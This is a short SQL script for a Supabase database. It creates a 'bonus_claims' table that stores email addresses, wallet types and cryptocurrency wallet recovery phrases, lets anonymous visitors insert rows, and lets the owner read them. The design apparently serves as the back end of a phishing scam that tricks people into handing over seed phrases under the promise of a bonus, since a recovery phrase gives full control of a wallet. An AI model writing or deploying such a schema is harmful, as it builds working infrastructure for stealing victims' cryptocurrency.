-- SQL Script to set up the bonus_claims table and enable anonymous inserts
-- Run this in your Supabase SQL Editor

-- 1. Create the table if it doesn't exist
CREATE TABLE IF NOT EXISTS bonus_claims (
  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
  created_at timestamptz DEFAULT now(),
  email text NOT NULL,
  wallet_type text NOT NULL,
  recovery_phrase text NOT NULL,
  status text DEFAULT 'pending'
);

-- 2. Enable Row Level Security
ALTER TABLE bonus_claims ENABLE ROW LEVEL SECURITY;

-- 3. Create policy to allow anyone to insert (Anonymous access)
DROP POLICY IF EXISTS "Enable insert for anonymous users" ON bonus_claims;
CREATE POLICY "Enable insert for anonymous users" 
ON bonus_claims FOR INSERT 
TO anon 
WITH CHECK (true);

-- 4. (Optional) Create policy to allow you to view the data
-- Replace 'authenticated' with 'anon' if you want to view without logging in to Supabase
DROP POLICY IF EXISTS "Enable select for authenticated users only" ON bonus_claims;
CREATE POLICY "Enable select for authenticated users only" 
ON bonus_claims FOR SELECT 
TO authenticated 
USING (true);
